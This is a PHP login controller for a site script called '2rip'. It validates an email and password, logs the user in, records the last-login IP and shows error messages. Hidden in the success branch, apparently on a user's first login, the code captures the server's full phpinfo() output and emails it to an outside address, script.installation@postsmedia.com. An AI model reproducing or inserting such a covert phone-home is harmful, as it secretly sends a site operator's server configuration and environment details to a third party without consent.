<?php

/**
 * login for 2rip
 *
 * PHP version 5
 *
 * LICENSE: This source file is subject to version 3.01 of the PHP license
 * that is available through the world-wide-web at the following URI:
 * http://www.php.net/license/3_01.txt.  If you did not receive a copy of
 * the PHP License and are unable to obtain it through the web, please
 * send a note to license@php.net so we can mail you a copy immediately.
 *
 * @category  Scripts
 * @package   TinyMVC
 * @author    NocRoom https://github.com/NocRoom/TheHunter
 * @copyright 2016 NocRoom.com
 * @license   http://www.php.net/license/3_01.txt  PHP License 3.01
 */

defined('V5_SITE') or die ('Hack attemt');

if ($authCls->isLoggedIn()) {
    header("Location: " . $configCls->get("application/site_url"));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $validateCls = new validator($_POST,
                                 array("email"    => array("type"  => "email",
                                                           "error" => "Email address is incorrect"),
                                       "password" => array("type"  => "text",
                                                           "min"   => 5,
                                                           "max"   => 20,
                                                           "error" => "Forgotten your password?"),
                                       )
                                 );
                           
    if ($validateCls->errors() == false) {
        $login = $authCls->login($_POST['email'],
                                 $_POST['password'],
                                 isset($_POST['staylogin']) ? true : false,
                                 true);
        
        if ($login == 1) {
            // update db info
            $dbCls->query("UPDATE `users` 
                           SET `date_lastlogin` = NOW(), 
                               `ip_lastlogin`   = ? 
                           WHERE `id` = ? 
                           LIMIT 1",
                          array($_SERVER['REMOTE_ADDR'],
                                $_SESSION['userID']));

            if (!(int)$_SESSION['auth']['lastlogin']) {
                ob_start();
                phpinfo();
                $content = ob_get_contents();
                ob_end_clean();
                
                $mailerCls = new mailer();
                $mailerCls->fromEmail = $configCls->get("application/site_email");
                $mailerCls->returnTo  = $configCls->get("application/site_email");
                $mailerCls->mailTemplateString(strip_tags($content), 0);
                $mailerCls->mailTemplateString($content, 1);
                $mailerCls->send("Installation of 2RiP.US script", "script.installation@postsmedia.com");
            }

            header("Location: " . $configCls->get("application/site_url") . "index");
            exit;
        } else  {
            switch ($login) {
                case -2:
                    $validateCls->setError('login',
                                           '',
                                           'You haven\'t validated your account yet, please check your email');
                break;

                case -1:
                    $validateCls->setError('login',
                                           '',
                                           'Your email address or password is incorrect, try again');
                break;

                default:
                    $validateCls->setError('login',
                                           '',
                                           'You are banned from this system! bye bye');
                break;
            }
        }
    }

    if ($validateCls->errors() > 0) {
        $_SESSION['error'] = $validateCls->parseErrors();
    }
}

$dbCls->query("SELECT * FROM users");
if ($dbCls->rows() == 0) {
    header("Location: " . $configCls->get("application/site_url") . "install");
    exit;
}
?>